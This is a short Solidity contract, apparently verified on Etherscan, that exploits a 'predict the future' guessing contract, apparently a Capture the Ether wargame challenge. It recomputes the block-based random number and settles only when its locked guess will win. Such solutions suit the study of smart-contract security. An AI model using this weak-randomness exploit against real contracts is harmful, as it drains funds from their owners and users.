/**
 *Submitted for verification at Etherscan.io on 2021-08-05
*/

pragma solidity ^0.4.21;

interface IPredictTheFuture {
    function lockInGuess(uint8 n) external payable;
    function settle() external;
}

contract CheatTheFuture {
    function triggerGuess() public {
        IPredictTheFuture i = IPredictTheFuture(0x65ff2fE2BD18c55855c8B408E8e41541D506b616);
        i.lockInGuess.value(1 ether)(1);
    }
    
    function attemptGuess() public {
        IPredictTheFuture i = IPredictTheFuture(0x65ff2fE2BD18c55855c8B408E8e41541D506b616);
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;
        require(answer == 1);
        i.settle();
    }
    
    function() public payable {}
}